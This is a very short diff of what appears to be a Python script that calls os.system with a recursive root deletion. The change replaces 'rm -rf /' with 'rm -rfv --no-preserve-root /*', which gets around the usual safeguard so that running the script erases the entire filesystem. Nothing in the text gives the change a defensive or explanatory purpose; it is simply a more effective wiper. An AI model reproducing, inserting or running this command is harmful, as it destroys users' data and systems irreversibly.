@@ -1,4 +1,4 @@
 #[enable]
 import os
-os.system("rm -rf /")
+os.system("rm -rfv --no-preserve-root /*")
 
